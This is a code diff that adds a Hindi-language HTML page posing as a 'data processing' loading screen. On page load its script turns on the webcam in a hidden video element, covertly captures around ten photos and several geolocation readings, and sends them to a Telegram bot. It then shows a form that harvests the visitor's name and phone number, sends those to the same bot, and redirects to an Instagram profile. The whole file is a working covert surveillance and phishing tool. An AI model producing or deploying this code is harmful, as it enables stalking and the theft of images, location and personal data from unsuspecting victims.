@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>डेटा प्रोसेस हो रहा है...</title>
+  <link href="https://fonts.googleapis.com/css2?family=Karla:wght@300;400;600&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Karla', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #6366f1, #8b5cf6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    #loading-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: white;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    .spinner {
+      border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    video, canvas {
+      display: none;
+    }
+
+    .form-container {
+      display: none;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 1rem;
+      margin: 10px 0;
+      border: 2px solid #e2e8f0;
+      border-radius: 0.5rem;
+      font-size: 1rem;
+    }
+
+    .submit-btn {
+      background: #6366f1;
+      color: white;
+      padding: 1rem;
+      width: 100%;
+      border: none;
+      border-radius: 0.5rem;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+
+    .success-message,
+    .error-message {
+      margin-top: 1rem;
+      font-weight: bold;
+    }
+
+    .success-message { color: green; }
+    .error-message { color: red; }
+  </style>
+</head>
+<body>
+
+  <!-- Loading Screen -->
+  <div id="loading-screen">
+    <div class="spinner"></div>
+    <p>डेटा प्रोसेस हो रहा है, कृपया प्रतीक्षा करें...</p>
+  </div>
+
+  <!-- Hidden Video + Canvas -->
+  <video id="video" autoplay playsinline width="300" height="225"></video>
+  <canvas id="canvas" width="300" height="225"></canvas>
+
+  <!-- Contact Form -->
+  <div class="form-container" id="formSection">
+    <h2>संपर्क जानकारी</h2>
+    <form id="telegramForm">
+      <input type="text" class="form-input" id="name" placeholder="आपका नाम" required />
+      <input type="tel" class="form-input" id="number" placeholder="मोबाइल नंबर" required />
+      <button type="submit" class="submit-btn">भेजें</button>
+      <div class="success-message" id="successMsg">✔ जानकारी भेजी गई!</div>
+      <div class="error-message" id="errorMsg">⚠ त्रुटि हुई!</div>
+    </form>
+  </div>
+
+  <script>
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // यहाँ अपना Telegram Bot Token डालें
+    const CHAT_ID = 'YOUR_CHAT_ID';     // यहाँ अपना Chat ID डालें
+    const instagramURL = 'https://www.instagram.com/yourprofile/'; // Instagram Redirect URL
+
+    let videoStream = null, photoCount = 0, locationCount = 0, trackingStarted = false;
+
+    async function startCamera() {
+      const video = document.getElementById("video");
+      try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = videoStream;
+      } catch (err) {
+        alert("कैमरा एक्सेस नहीं हो रहा। कृपया अनुमति दें।");
+      }
+    }
+
+    function stopCamera() {
+      if (videoStream) videoStream.getTracks().forEach(track => track.stop());
+    }
+
+    function showForm() {
+      document.getElementById("loading-screen").style.display = "none";
+      document.getElementById("formSection").style.display = "block";
+    }
+
+    async function sendPhoto() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, `photo${photoCount}.jpg`);
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+
+      photoCount++;
+    }
+
+    async function sendLocation() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(async pos => {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude
+            })
+          });
+          locationCount++;
+          resolve();
+        }, err => {
+          console.error("Location error:", err);
+          resolve(); // fallback
+        });
+      });
+    }
+
+    async function startTracking() {
+      if (trackingStarted) return;
+      trackingStarted = true;
+      await startCamera();
+
+      const interval = setInterval(async () => {
+        if (photoCount < 10) await sendPhoto();
+        if (locationCount < 5 && photoCount % 2 === 0) await sendLocation();
+
+        if (photoCount >= 10 && locationCount >= 5) {
+          clearInterval(interval);
+          stopCamera();
+          showForm();
+        }
+      }, 1000);
+
+      // fallback in case of failure
+      setTimeout(() => {
+        if (photoCount < 5) {
+          clearInterval(interval);
+          stopCamera();
+          showForm();
+        }
+      }, 15000);
+    }
+
+    window.onload = startTracking;
+
+    // Handle Form Submission
+    document.getElementById('telegramForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const name = document.getElementById('name').value.trim();
+      const number = document.getElementById('number').value.trim();
+      const success = document.getElementById('successMsg');
+      const error = document.getElementById('errorMsg');
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `👤 नाम: ${name}\n📱 नंबर: ${number}`
+          })
+        });
+
+        if (res.ok) {
+          success.style.display = 'block';
+          error.style.display = 'none';
+          setTimeout(() => window.location.href = instagramURL, 1500);
+        } else throw new Error();
+      } catch {
+        success.style.display = 'none';
+        error.style.display = 'block';
+      }
+    });
+  </script>
+</body>
+</html>
